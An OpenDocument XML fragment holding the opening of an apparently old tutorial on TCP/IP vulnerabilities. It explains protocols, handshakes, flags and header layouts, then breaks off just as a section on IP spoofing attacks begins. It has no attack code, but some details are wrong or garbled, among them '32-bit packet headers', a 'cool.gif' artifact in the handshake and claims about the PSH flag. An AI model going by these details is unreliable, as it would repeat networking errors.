    <style:style style:name="P931" style:parent-style-name="Normal" style:family="paragraph">
      <style:text-properties fo:language="en" fo:country="US"/>
    </style:style>
    <style:style style:name="P932" style:parent-style-name="Normal" style:family="paragraph">
      <style:text-properties fo:language="en" fo:country="US"/>
    </style:style>
    <style:style style:name="P933" style:parent-style-name="Normal" style:family="paragraph">
      <style:text-properties fo:language="en" fo:country="US"/>
    </style:style>
    <style:style style:name="P934" style:parent-style-name="Normal" style:family="paragraph">
      <style:text-properties fo:language="en" fo:country="US"/>
    </style:style>
    <style:style style:name="P935" style:parent-style-name="Normal" style:family="paragraph">
      <style:text-properties fo:language="en" fo:country="US"/>
    </style:style>
    <style:style style:name="P936" style:parent-style-name="Normal" style:family="paragraph">
      <style:text-properties fo:language="en" fo:country="US"/>
    </style:style>
    <style:style style:name="P937" style:parent-style-name="Normal" style:family="paragraph">
      <style:text-properties fo:language="en" fo:country="US"/>
    </style:style>
    <style:style style:name="P938" style:parent-style-name="Normal" style:family="paragraph">
      <style:text-properties fo:language="en" fo:country="US"/>
    </style:style>
    <style:style style:name="P939" style:parent-style-name="Normal" style:family="paragraph">
      <style:text-properties fo:language="en" fo:country="US"/>
    </style:style>
    <style:style style:name="P940" style:parent-style-name="Normal" style:family="paragraph">
      <style:text-properties fo:language="en" fo:country="US"/>
    </style:style>
    <style:style style:name="P941" style:parent-style-name="Normal" style:family="paragraph">
      <style:text-properties fo:language="en" fo:country="US"/>
    </style:style>
    <style:style style:name="P942" style:parent-style-name="Normal" style:family="paragraph">
      <style:text-properties fo:language="en" fo:country="US"/>
    </style:style>
    <style:style style:name="P943" style:parent-style-name="Normal" style:family="paragraph">
      <style:text-properties fo:language="en" fo:country="US"/>
    </style:style>
    <style:style style:name="P944" style:parent-style-name="Normal" style:family="paragraph">
      <style:text-properties fo:language="en" fo:country="US"/>
    </style:style>
    <style:style style:name="P945" style:parent-style-name="Normal" style:family="paragraph">
      <style:text-properties fo:language="en" fo:country="US"/>
    </style:style>
    <style:style style:name="P946" style:parent-style-name="Normal" style:family="paragraph">
      <style:text-properties fo:language="en" fo:country="US"/>
    </style:style>
    <style:style style:name="P947" style:parent-style-name="Normal" style:family="paragraph">
      <style:text-properties fo:language="en" fo:country="US"/>
    </style:style>
    <style:style style:name="P948" style:parent-style-name="Normal" style:family="paragraph">
      <style:text-properties fo:language="en" fo:country="US"/>
    </style:style>
    <style:style style:name="P949" style:parent-style-name="Normal" style:family="paragraph">
      <style:text-properties fo:language="en" fo:country="US"/>
    </style:style>
    <style:style style:name="P950" style:parent-style-name="Normal" style:family="paragraph">
      <style:text-properties fo:language="en" fo:country="US"/>
    </style:style>
    <style:style style:name="P951" style:parent-style-name="Normal" style:family="paragraph">
      <style:text-properties fo:language="en" fo:country="US"/>
    </style:style>
    <style:style style:name="P952" style:parent-style-name="Normal" style:family="paragraph">
      <style:text-properties fo:language="en" fo:country="US"/>
    </style:style>
    <style:style style:name="P953" style:parent-style-name="Normal" style:family="paragraph">
      <style:text-properties fo:language="en" fo:country="US"/>
    </style:style>
    <style:style style:name="P954" style:parent-style-name="Normal" style:family="paragraph">
      <style:text-properties fo:language="en" fo:country="US"/>
    </style:style>
    <style:style style:name="P955" style:parent-style-name="Normal" style:family="paragraph">
      <style:text-properties fo:language="en" fo:country="US"/>
    </style:style>
    <style:style style:name="P956" style:parent-style-name="Normal" style:family="paragraph">
      <style:text-properties fo:language="en" fo:country="US"/>
    </style:style>
    <style:style style:name="P957" style:parent-style-name="Normal" style:family="paragraph">
      <style:text-properties fo:language="en" fo:country="US"/>
    </style:style>
    <style:style style:name="P958" style:parent-style-name="Normal" style:family="paragraph">
      <style:text-properties fo:language="en" fo:country="US"/>
    </style:style>
    <style:style style:name="P959" style:parent-style-name="Normal" style:family="paragraph">
      <style:text-properties fo:language="en" fo:country="US"/>
    </style:style>
    <style:style style:name="P960" style:parent-style-name="Normal" style:family="paragraph">
      <style:text-properties fo:language="en" fo:country="US"/>
    </style:style>
    <style:style style:name="P961" style:parent-style-name="Normal" style:family="paragraph">
      <style:text-properties fo:language="en" fo:country="US"/>
    </style:style>
    <style:style style:name="P962" style:parent-style-name="Normal" style:family="paragraph">
      <style:text-properties fo:language="en" fo:country="US"/>
    </style:style>
    <style:style style:name="P963" style:parent-style-name="Normal" style:family="paragraph">
      <style:text-properties fo:language="en" fo:country="US"/>
    </style:style>
    <style:style style:name="P964" style:parent-style-name="Normal" style:family="paragraph">
      <style:text-properties fo:language="en" fo:country="US"/>
    </style:style>
    <style:style style:name="P965" style:parent-style-name="Normal" style:family="paragraph">
      <style:text-properties fo:language="en" fo:country="US"/>
    </style:style>
    <style:style style:name="P966" style:parent-style-name="Normal" style:family="paragraph">
      <style:text-properties fo:language="en" fo:country="US"/>
    </style:style>
    <style:style style:name="P967" style:parent-style-name="Normal" style:family="paragraph">
      <style:text-properties fo:language="en" fo:country="US"/>
    </style:style>
    <style:style style:name="P968" style:parent-style-name="Normal" style:family="paragraph">
      <style:text-properties fo:language="en" fo:country="US"/>
    </style:style>
    <style:style style:name="P969" style:parent-style-name="Normal" style:family="paragraph">
      <style:text-properties fo:language="en" fo:country="US"/>
    </style:style>
    <style:style style:name="P970" style:parent-style-name="Normal" style:family="paragraph">
      <style:text-properties fo:language="en" fo:country="US"/>
    </style:style>
    <style:style style:name="P971" style:parent-style-name="Normal" style:family="paragraph">
      <style:text-properties fo:language="en" fo:country="US"/>
    </style:style>
    <style:style style:name="P972" style:parent-style-name="Normal" style:family="paragraph">
      <style:text-properties fo:language="en" fo:country="US"/>
    </style:style>
    <style:style style:name="P973" style:parent-style-name="Normal" style:family="paragraph">
      <style:text-properties fo:language="en" fo:country="US"/>
    </style:style>
    <style:style style:name="P974" style:parent-style-name="Normal" style:family="paragraph">
      <style:text-properties fo:language="en" fo:country="US"/>
    </style:style>
    <style:style style:name="P975" style:parent-style-name="Normal" style:family="paragraph">
      <style:text-properties fo:language="en" fo:country="US"/>
    </style:style>
    <style:style style:name="P976" style:parent-style-name="Normal" style:family="paragraph">
      <style:text-properties fo:language="en" fo:country="US"/>
    </style:style>
    <style:style style:name="P977" style:parent-style-name="Normal" style:family="paragraph">
      <style:text-properties fo:language="en" fo:country="US"/>
    </style:style>
    <style:style style:name="P978" style:parent-style-name="Normal" style:family="paragraph">
      <style:text-properties fo:language="en" fo:country="US"/>
    </style:style>
    <style:style style:name="P979" style:parent-style-name="Normal" style:family="paragraph">
      <style:text-properties fo:language="en" fo:country="US"/>
    </style:style>
    <style:style style:name="P980" style:parent-style-name="Normal" style:family="paragraph">
      <style:text-properties fo:language="en" fo:country="US"/>
    </style:style>
    <style:style style:name="P981" style:parent-style-name="Normal" style:family="paragraph">
      <style:text-properties fo:language="en" fo:country="US"/>
    </style:style>
    <style:style style:name="P982" style:parent-style-name="Normal" style:family="paragraph">
      <style:text-properties fo:language="en" fo:country="US"/>
    </style:style>
    <style:style style:name="P983" style:parent-style-name="Normal" style:family="paragraph">
      <style:text-properties fo:language="en" fo:country="US"/>
    </style:style>
    <style:style style:name="P984" style:parent-style-name="Normal" style:family="paragraph">
      <style:text-properties fo:language="en" fo:country="US"/>
    </style:style>
    <style:style style:name="P985" style:parent-style-name="Normal" style:family="paragraph">
      <style:text-properties fo:language="en" fo:country="US"/>
    </style:style>
    <style:style style:name="P986" style:parent-style-name="Normal" style:family="paragraph">
      <style:text-properties fo:language="en" fo:country="US"/>
    </style:style>
    <style:style style:name="P987" style:parent-style-name="Normal" style:family="paragraph">
      <style:text-properties fo:language="en" fo:country="US"/>
    </style:style>
    <style:style style:name="P988" style:parent-style-name="Normal" style:family="paragraph">
      <style:text-properties fo:language="en" fo:country="US"/>
    </style:style>
    <style:style style:name="P989" style:parent-style-name="Normal" style:family="paragraph">
      <style:text-properties fo:language="en" fo:country="US"/>
    </style:style>
    <style:style style:name="P990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 text:c="16"/>**************************************************************</text:p>
      <text:p text:style-name="P2"><text:s text:c="16"/>* <text:s text:c="9"/>TCP/IP VULNERABILITIES AND WEAKNESSES <text:s text:c="12"/>*</text:p>
      <text:p text:style-name="P3"><text:s text:c="16"/>**************************************************************</text:p>
      <text:p text:style-name="P4"/>
      <text:p text:style-name="P5">The intent of this paper is to explain and explore the various serious</text:p>
      <text:p text:style-name="P6">vulnerabilities in the TCP/IP suite, and IPv4 itself. I assume you have a</text:p>
      <text:p text:style-name="P7">working knowledge of UNIX-like systems and know a *little* about networking.</text:p>
      <text:p text:style-name="P8"/>
      <text:p text:style-name="P9">I will first start with essential IP background knowledge, and then move onto</text:p>
      <text:p text:style-name="P10">various vulnerabilities in TCP/IP.</text:p>
      <text:p text:style-name="P11"/>
      <text:p text:style-name="P12"/>
      <text:p text:style-name="P13">[SECTION I - BACKGROUND KNOWLEDGE]</text:p>
      <text:p text:style-name="P14"/>
      <text:p text:style-name="P15">--[ 1.0 INTERNET PROTOCOL - ANATOMY / THEORY ]--</text:p>
      <text:p text:style-name="P16">The Internet Protocol, also widely known as 'IP', is a connectionless,</text:p>
      <text:p text:style-name="P17">semi-reliable Network protocol, originally developed by the U.S military</text:p>
      <text:p text:style-name="P18">intended to be a usable network topology for its internal communications. IP</text:p>
      <text:p text:style-name="P19">provides a layered protocol structure for Network communications. In this</text:p>
      <text:p text:style-name="P20">structure, each protocol provides a sort of function to the layer above it (see</text:p>
      <text:p text:style-name="P21">below).</text:p>
      <text:p text:style-name="P22"/>
      <text:p text:style-name="P23">The TCP/IP suite consists of 4 main protocols, within itself:</text:p>
      <text:p text:style-name="P24"/>
      <text:p text:style-name="P25">* IP</text:p>
      <text:p text:style-name="P26">* TCP</text:p>
      <text:p text:style-name="P27">* UDP</text:p>
      <text:p text:style-name="P28">* ICMP</text:p>
      <text:p text:style-name="P29"/>
      <text:p text:style-name="P30">Although IP is the most important of protocols in this list, it cannot by itself</text:p>
      <text:p text:style-name="P31">do much, such as make connections. This is where the "Transport-layer"</text:p>
      <text:soft-page-break/>
      <text:p text:style-name="P32">protocols come in, such as TCP and UDP, whilst the "Network Protocols" (IP,</text:p>
      <text:p text:style-name="P33">ICMP) do the slightly lower-level stuff.</text:p>
      <text:p text:style-name="P34"/>
      <text:p text:style-name="P35">Arguable the most important and most widely used transport protocol is TCP, and</text:p>
      <text:p text:style-name="P36">probably shall be for a while to come.</text:p>
      <text:p text:style-name="P37"/>
      <text:p text:style-name="P38">I will below briefly describe the basic purposes for each protocol, their</text:p>
      <text:p text:style-name="P39">characteristics, and their common misconceptions.</text:p>
      <text:p text:style-name="P40"/>
      <text:p text:style-name="P41">--] 1.1 PROTOCOLS - IP</text:p>
      <text:p text:style-name="P42">This is the backbone protocol of the entire TCP/IP suite. However, it cannot do</text:p>
      <text:p text:style-name="P43">much on its own. IP uses 32-bit packet headers to store address data, and is</text:p>
      <text:p text:style-name="P44">the busiest protocol included in the TCP/IP suite. One major security flaw</text:p>
      <text:p text:style-name="P45">within IP itself (this security flaw is one of the main ideas used in this</text:p>
      <text:p text:style-name="P46">paper) is the fact that the IP protocol stack does not verify the supplied</text:p>
      <text:p text:style-name="P47">"source address", and just assumes that the packet’s "source address" is the</text:p>
      <text:p text:style-name="P48">proper valid one. As you can see, this is a major flaw.</text:p>
      <text:p text:style-name="P49">IP packets usually contain quite a few flags, and other important bits of data.</text:p>
      <text:p text:style-name="P50">These I will explain later below.</text:p>
      <text:p text:style-name="P51"/>
      <text:p text:style-name="P52"/>
      <text:p text:style-name="P53">--] 1.2 PROTOCOLS - TCP</text:p>
      <text:p text:style-name="P54">TCP stands for "Transmission Control Protocol" and is the most used and</text:p>
      <text:p text:style-name="P55">most popular transfer-level protocol included in the TCP/IP protocol suite. TCP</text:p>
      <text:p text:style-name="P56">is VERY general purpose, and used for most modern network daemons distributed</text:p>
      <text:p text:style-name="P57">across the Internet. The TCP protocol first requires that a connection is</text:p>
      <text:p text:style-name="P58">established between two hosts, before any real communication can take place (see</text:p>
      <text:p text:style-name="P59">the "TCP/IP - The Three-Way Handshake" below). TCP is a very reliable transfer</text:p>
      <text:p text:style-name="P60">protocol, which is one of the reasons it remains the most popular transfer</text:p>
      <text:p text:style-name="P61">protocol in wide-use, and ensures always that all data sent arrives in the</text:p>
      <text:p text:style-name="P62">correct order, and not jumbled up. TCP is also a very fast protocol,<text:s/>so</text:p>
      <text:soft-page-break/>
      <text:p text:style-name="P63">combined with the above information, it is easy to see that TCP is an ideal</text:p>
      <text:p text:style-name="P64">protocol in itself, but contains its own problems related to security. You will</text:p>
      <text:p text:style-name="P65">learn about many of these later.</text:p>
      <text:p text:style-name="P66">TCP/IP packets contain quite a few headers and flags, which I will attempt to</text:p>
      <text:p text:style-name="P67">explain in a little detail later, focusing on their prime purposes and</text:p>
      <text:p text:style-name="P68">attributes.</text:p>
      <text:p text:style-name="P69"/>
      <text:p text:style-name="P70"/>
      <text:p text:style-name="P71">--] 1.3 PROTOCOLS - UDP</text:p>
      <text:p text:style-name="P72">UDP is a connectionless protocol, and stands for "User Datagram Protocol", which</text:p>
      <text:p text:style-name="P73">unlike TCP, DOESN'T guarentee that all data sent arrives in the correct order at</text:p>
      <text:p text:style-name="P74">all. Also unlike TCP, UDP does not actually guarentee the receipt of data sent</text:p>
      <text:p text:style-name="P75">at all, and it can be downright annoying when data goes missing, and packets are</text:p>
      <text:p text:style-name="P76">not received, along the way.</text:p>
      <text:p text:style-name="P77">Although TCP IMHO outranks UDP by far, UDP does still have its advantages; UDP,</text:p>
      <text:p text:style-name="P78">although is pretty unreliable, is fast. Very much faster than TCP, infact.</text:p>
      <text:p text:style-name="P79">Faster enough to the extent that developers when writing certain programs</text:p>
      <text:p text:style-name="P80">sacrafice the slight possibility that data might not arrive sometimes to gain</text:p>
      <text:p text:style-name="P81">the advantage of speed in their Network applications. One common example of</text:p>
      <text:p text:style-name="P82">this is in games.</text:p>
      <text:p text:style-name="P83">UDP is actually quite a simple protocol, and datagrams contain no flags or</text:p>
      <text:p text:style-name="P84">sequence numbers.</text:p>
      <text:p text:style-name="P85"/>
      <text:p text:style-name="P86"/>
      <text:p text:style-name="P87">--] 1.4 PROTOCOLS - ICMP</text:p>
      <text:p text:style-name="P88">ICMP - ICMP, which stands for "Internet Control Message Protocol", is also a</text:p>
      <text:p text:style-name="P89">connectionless protocol. Possibly the most common use for ICMP is</text:p>
      <text:p text:style-name="P90">error-checking. For example, if a user sends a UDP datagram to a host, and the</text:p>
      <text:p text:style-name="P91">remote host is not running a Network daemon on the port the datagram was</text:p>
      <text:p text:style-name="P92">addressed to, the remote host will send out an ICMP packet, with Type code 3</text:p>
      <text:p text:style-name="P93">set, Destination Unreachable (ICMP_UNREACH).</text:p>
      <text:soft-page-break/>
      <text:p text:style-name="P94">ICMP is a "Network Protocol", which is on the same level as IP, at a lower level</text:p>
      <text:p text:style-name="P95">than transmission level protocols, such as UDP and TCP.</text:p>
      <text:p text:style-name="P96">Another very common use for ICMP packets is to see if a host is up, aka ping.</text:p>
      <text:p text:style-name="P97"/>
      <text:p text:style-name="P98"/>
      <text:p text:style-name="P99">--] 1.5 INTERNET PROTOCOL - PORTS</text:p>
      <text:p text:style-name="P100">Ports are basically, with technically sucked out, a user interface, used by the</text:p>
      <text:p text:style-name="P101">kernel to identify network processes at any time. Together with an IP address,</text:p>
      <text:p text:style-name="P102">a port provides a specific destination process on an IP connected host to</text:p>
      <text:p text:style-name="P103">deliver an addressed packet to. Ports are, however, strictly transport-protocol</text:p>
      <text:p text:style-name="P104">level only, in other words IP itself has nothing much to do with them.</text:p>
      <text:p text:style-name="P105"/>
      <text:p text:style-name="P106">Ports are used only in Higher-level protocols (transfer protocols), namely TCP</text:p>
      <text:p text:style-name="P107">and UDP. You will often hear the phrase "Well-known ports" during discussions</text:p>
      <text:p text:style-name="P108">of ports. The port range 1-1023 are the "well-known ports", and are usually</text:p>
      <text:p text:style-name="P109">restricted so that only root (or the administrator) can bind to them. Any port</text:p>
      <text:p text:style-name="P110">1024 ad onwards can be used by any user, as long as they are not already in use.</text:p>
      <text:p text:style-name="P111"/>
      <text:p text:style-name="P112">Processes bound to ports are usually described as "Network daemons" or</text:p>
      <text:p text:style-name="P113">"daemons". They are the programs which provide specific services to the client</text:p>
      <text:p text:style-name="P114">host during a TCP or UDP connection between two hosts.</text:p>
      <text:p text:style-name="P115"/>
      <text:p text:style-name="P116"/>
      <text:p text:style-name="P117">--] 1.6 TCP/IP - THE THREE-WAY-HANDSHAKE</text:p>
      <text:p text:style-name="P118">Before two hosts can communicate via a TCP/IP connection, a connection of</text:p>
      <text:p text:style-name="P119">"trust" must first be established, as a means of communication. The TCP</text:p>
      <text:p text:style-name="P120">connection establishment process is divided in three parts, also known as "The</text:p>
      <text:p text:style-name="P121">three-way-handshake". I will attempt to explain this process in a little</text:p>
      <text:p text:style-name="P122">detail:</text:p>
      <text:p text:style-name="P123"/>
      <text:p text:style-name="P124">******************************************</text:p>
      <text:soft-page-break/>
      <text:p text:style-name="P125">CLIENT: SYN (ISN A) -&gt; SERVER</text:p>
      <text:p text:style-name="P126">SERVER: SYN (ISN cool.gif, ACK (ISN A + 1) -&gt; CLIENT</text:p>
      <text:p text:style-name="P127">CLIENT: ACK (ISN B + 1) -&gt; SERVER</text:p>
      <text:p text:style-name="P128">******************************************</text:p>
      <text:p text:style-name="P129"/>
      <text:p text:style-name="P130">At this point, the connection is now established, and either hosts can proceed</text:p>
      <text:p text:style-name="P131">in sending data back and forth between the newly established connection. I will</text:p>
      <text:p text:style-name="P132">give a quick explanation of what the client and server were doing.</text:p>
      <text:p text:style-name="P133"/>
      <text:p text:style-name="P134">First, the CLIENT host sent a TCP/IP packet, with the SYN flag set, which tells</text:p>
      <text:p text:style-name="P135">the destination host that it wants to open a connection with it. Included in</text:p>
      <text:p text:style-name="P136">this packet is the CLIENT's ISN (Initial Sequence Number).</text:p>
      <text:p text:style-name="P137">The SERVER receives this connection request, and replies with a packet with the</text:p>
      <text:p text:style-name="P138">SYN flag set (SYNchronise flag), along with the ACK flag, to ACKnowledge the</text:p>
      <text:p text:style-name="P139">receipt of the first SYN packet. In the packet, the SERVER sets the ISN</text:p>
      <text:p text:style-name="P140">(Initial Sequence Number) accordingly ("randomly"), and sets the ACKnowledgement</text:p>
      <text:p text:style-name="P141">number as the CLIENT's ISN + 1.</text:p>
      <text:p text:style-name="P142">To complete the connection, the CLIENT host responds to the SYN|ACK packet with</text:p>
      <text:p text:style-name="P143">it's own ACK packet, to ACKnowledge the receipt of the previous packet, and sets</text:p>
      <text:p text:style-name="P144">the ACKnowledgement number as the SERVER's ISN + 1.</text:p>
      <text:p text:style-name="P145"/>
      <text:p text:style-name="P146">From that point onwards, from when the connection is sent into the state</text:p>
      <text:p text:style-name="P147">"ESTABLISHED", every packet sent from either of the two party hosts must have</text:p>
      <text:p text:style-name="P148">the ACK bit set, to ACKnowledge previously sent packets.</text:p>
      <text:p text:style-name="P149"/>
      <text:p text:style-name="P150"/>
      <text:p text:style-name="P151">--] 1.7 TCP/IP - THE FOUR-WAY-HANDSHAKE</text:p>
      <text:p text:style-name="P152">What goes up, must come down. Eventually, a TCP/IP connection between two hosts</text:p>
      <text:p text:style-name="P153">must be closed. To do this, the two hosts alternatively use a</text:p>
      <text:p text:style-name="P154">"four-way-handshake", just as a "three-way-handshake" is used to initiate a</text:p>
      <text:p text:style-name="P155">connection. Here is the sequence of packets sent:</text:p>
      <text:p text:style-name="P156"/>
      <text:p text:style-name="P157">******************************************</text:p>
      <text:p text:style-name="P158">CLIENT: FIN (SN) -&gt; SERVER</text:p>
      <text:p text:style-name="P159">SERVER: ACK (SN + 1) -&gt; CLIENT</text:p>
      <text:p text:style-name="P160">SERVER: FIN (SN) -&gt; CLIENT</text:p>
      <text:p text:style-name="P161">CLIENT: ACK (SN + 1) -&gt; SERVER</text:p>
      <text:p text:style-name="P162">******************************************</text:p>
      <text:p text:style-name="P163"/>
      <text:p text:style-name="P164">The connection, given a few seconds (usually 30-120 seconds), will be brought to</text:p>
      <text:p text:style-name="P165">a complete close. As you can probably gather what is happening, I will give</text:p>
      <text:p text:style-name="P166">only a brief explanation of what is happening:</text:p>
      <text:p text:style-name="P167"/>
      <text:p text:style-name="P168">The CLIENT (or SERVER, for that matter) sends a FIN packet to the SERVER (to</text:p>
      <text:p text:style-name="P169">tell it that it has FINished sending data), with the correct sequence number.</text:p>
      <text:p text:style-name="P170">The SERVER then sends a responding packet back, with the ACK bit set, to</text:p>
      <text:p text:style-name="P171">ACKnowledge the receipt of the packet, with the ACK number as the SN (Sequence</text:p>
      <text:p text:style-name="P172">Number) + 1.</text:p>
      <text:p text:style-name="P173">The SERVER then proceeds to send another packet, this time one with the correct</text:p>
      <text:p text:style-name="P174">sequence number set, and the FIN flag set.</text:p>
      <text:p text:style-name="P175">To finish off the four-way-handshake, and to close the connection, the CLIENT</text:p>
      <text:p text:style-name="P176">sends an ACK packet, with the ACK number as the SERVER's SN + 1.</text:p>
      <text:p text:style-name="P177"/>
      <text:p text:style-name="P178"/>
      <text:p text:style-name="P179">--] 1.8 TCP/IP - PACKET FLAGS</text:p>
      <text:p text:style-name="P180">As explained above, hosts send packets to one another with various different</text:p>
      <text:p text:style-name="P181">flags set, to do various different things, at various different times. Some</text:p>
      <text:p text:style-name="P182">examples of these flags are SYN, ACK and FIN. I attempt below to list all of</text:p>
      <text:p text:style-name="P183">the flags and flag combinations used in TCP/IP connections, and their purposes:</text:p>
      <text:p text:style-name="P184"/>
      <text:p text:style-name="P185">******************************************</text:p>
      <text:p text:style-name="P186">* SYN - This is the first packet in a connection, indicating to the server host</text:p>
      <text:soft-page-break/>
      <text:p text:style-name="P187">that it wants a connection with it.</text:p>
      <text:p text:style-name="P188"/>
      <text:p text:style-name="P189">* ACK - The ACK flag is used throughout the entire connection to ACKnowledge</text:p>
      <text:p text:style-name="P190">previously received packets. Examples include ACKnowledging a SYN packet, or a</text:p>
      <text:p text:style-name="P191">packet containing important data just received.</text:p>
      <text:p text:style-name="P192"/>
      <text:p text:style-name="P193">* FIN - This flag is used to indicate to the other host that they are FINished</text:p>
      <text:p text:style-name="P194">sending data, and that the connection can be consequently ended.</text:p>
      <text:p text:style-name="P195"/>
      <text:p text:style-name="P196">* RST - The RST packet is sent whenever the host receives an unexpected packet,</text:p>
      <text:p text:style-name="P197">such as an ACK with out ever receiving a SYN. This resets the connection, and</text:p>
      <text:p text:style-name="P198">the two hosts can reconnect, if needed.</text:p>
      <text:p text:style-name="P199"/>
      <text:p text:style-name="P200">* SYN|ACK - This combination of flags is used to ACKnowledge s received SYN</text:p>
      <text:p text:style-name="P201">packet, and to send it's SYN information to the remote host.</text:p>
      <text:p text:style-name="P202"/>
      <text:p text:style-name="P203">* FIN|ACK - The FIN|ACK flag combination is used to ACKnowledge the received FIN</text:p>
      <text:p text:style-name="P204">packet, and to complete the connection closing sequence.</text:p>
      <text:p text:style-name="P205"/>
      <text:p text:style-name="P206">* URG - This flag is seldom used in any legimate connection. It's actual</text:p>
      <text:p text:style-name="P207">purpose is to indicate that the contained data is URGent.</text:p>
      <text:p text:style-name="P208"/>
      <text:p text:style-name="P209">* PSH - The PSH flag is also seldomly used in legimate connections too. It's</text:p>
      <text:p text:style-name="P210">purpose is to flush all queued data.</text:p>
      <text:p text:style-name="P211">******************************************</text:p>
      <text:p text:style-name="P212"/>
      <text:p text:style-name="P213">As you can see, there are many packet flags, some used more than others. You</text:p>
      <text:p text:style-name="P214">will learn more about these later, when I explain various vulnerabilities in the</text:p>
      <text:p text:style-name="P215">TCP/IP suite.</text:p>
      <text:p text:style-name="P216"/>
      <text:p text:style-name="P217"/>
      <text:soft-page-break/>
      <text:p text:style-name="P218">--] 1.9 TCP/IP - PACKETS</text:p>
      <text:p text:style-name="P219">In IP packets, there are various important and essential pieces of data in a</text:p>
      <text:p text:style-name="P220">packet, depending on what protocol a packet belongs to (e.g ICMP, TCP etc...).</text:p>
      <text:p text:style-name="P221">Below I attempt to explain various important things in each type of</text:p>
      <text:p text:style-name="P222">packet/datagram.</text:p>
      <text:p text:style-name="P223"/>
      <text:p text:style-name="P224">* IP - There are a lot of headers in the IP section of a packet. Some of the</text:p>
      <text:p text:style-name="P225">essential ones include: source address, destination address, TOS, TTL, packet</text:p>
      <text:p text:style-name="P226">ID, protocol (i.e TCP or UDP), IP version (4 obviously), packet length, the</text:p>
      <text:p text:style-name="P227">checksum, and the IP header lengths. These need to be set in every</text:p>
      <text:p text:style-name="Normal"><text:span text:style-name="T228">packet/datagram/segment sent, be it TCP, UDP or ICMP.</text:span></text:p>
      <text:p text:style-name="P229"/>
      <text:p text:style-name="P230">* TCP - In the TCP protocol, the important things in a packet are the essential</text:p>
      <text:p text:style-name="P231">IP packet headers, and various TCP specific headers and flags. These include:</text:p>
      <text:p text:style-name="P232">source port, destination port, header lengths, the sequence number, the ACK</text:p>
      <text:p text:style-name="P233">number, the checksum and various other flags.</text:p>
      <text:p text:style-name="P234">Here is a diagram to illustrate the basic format of a typical TCP packet:</text:p>
      <text:p text:style-name="P235"/>
      <text:p text:style-name="P236">+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+</text:p>
      <text:p text:style-name="P237">| Source Port | Destination Port |</text:p>
      <text:p text:style-name="P238">+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+</text:p>
      <text:p text:style-name="P239">| Sequence Number |</text:p>
      <text:p text:style-name="P240">+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+</text:p>
      <text:p text:style-name="P241">| ACK Number |</text:p>
      <text:p text:style-name="P242">+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+</text:p>
      <text:p text:style-name="P243">|Offset |(reserved) | Flags | Window |</text:p>
      <text:p text:style-name="P244">+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+</text:p>
      <text:p text:style-name="P245">| Checksum | URG Pointer |</text:p>
      <text:p text:style-name="P246">+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+</text:p>
      <text:p text:style-name="P247">| Packet Options (Padding) |</text:p>
      <text:p text:style-name="P248">+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+</text:p>
      <text:soft-page-break/>
      <text:p text:style-name="P249">| User Data |</text:p>
      <text:p text:style-name="P250">+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+</text:p>
      <text:p text:style-name="P251"/>
      <text:p text:style-name="P252"/>
      <text:p text:style-name="P253">* UDP - As well as TCP, UDP datagrams need the IP packet headers and flags set,</text:p>
      <text:p text:style-name="P254">and then the UDP specific ones set. The important ones are: source port,</text:p>
      <text:p text:style-name="P255">destination port, the checksum and header lengths.</text:p>
      <text:p text:style-name="P256">Here is what a typical UDP datagram looks like:</text:p>
      <text:p text:style-name="P257"/>
      <text:p text:style-name="P258">+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+</text:p>
      <text:p text:style-name="P259">| Source Port | Destination Port |</text:p>
      <text:p text:style-name="P260">+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+</text:p>
      <text:p text:style-name="P261">| Length | Checksum |</text:p>
      <text:p text:style-name="P262">+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+</text:p>
      <text:p text:style-name="P263">| User Data |</text:p>
      <text:p text:style-name="P264">+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+</text:p>
      <text:p text:style-name="P265"/>
      <text:p text:style-name="P266">As I said earlier, there are only a few things that a UDP packet holds, as UDP</text:p>
      <text:p text:style-name="P267">is a very simple connectionless protocol, thus needs to transfer less</text:p>
      <text:p text:style-name="P268">information in it's datagrams.</text:p>
      <text:p text:style-name="P269"/>
      <text:p text:style-name="P270"/>
      <text:p text:style-name="P271">* ICMP - Again, as in every IP packet, the IP packet headers and flags are</text:p>
      <text:p text:style-name="P272">once again needed. There is only three things that need to go in an ICMP</text:p>
      <text:p text:style-name="P273">packet: message type, code and checksum. The type specifies what type of ICMP</text:p>
      <text:p text:style-name="P274">request it is, e.g ICMP_ECHO (ping).</text:p>
      <text:p text:style-name="P275"/>
      <text:p text:style-name="P276"/>
      <text:p text:style-name="P277">[SECTION II - ATTACKS]</text:p>
      <text:p text:style-name="P278"/>
      <text:p text:style-name="P279">--[ 1.0 ATTACKS - IP SPOOFING ]--</text:p>
      <text:soft-page-break/>
      <text:p text:style-name="P280">Due to bad designing of the TCP/IP suite, it is almost trivial to spoof a packet</text:p>
      <text:p text:style-name="P281">apparently originating from a host that is NOT you. The term 'IP spoofing' can</text:p>
      <text:p text:style-name="P282">be used to describe any process in which a person fakes, or "forges" a packet to</text:p>
      <text:p text:style-name="P283">look like it came from elsewhere, often a "trusted" host. The ability to spoof</text:p>
      <text:p text:style-name="P284">IP packets, and the fact that IPv4 does NOT check the validity of the source</text:p>
      <text:p text:style-name="P285">address and source port in a packet's headers is one of the MAIN vulnerabilities</text:p>
      <text:p text:style-name="P286">in the TCP/IP protocol suite.</text:p>
      <text:p text:style-name="P287"/>
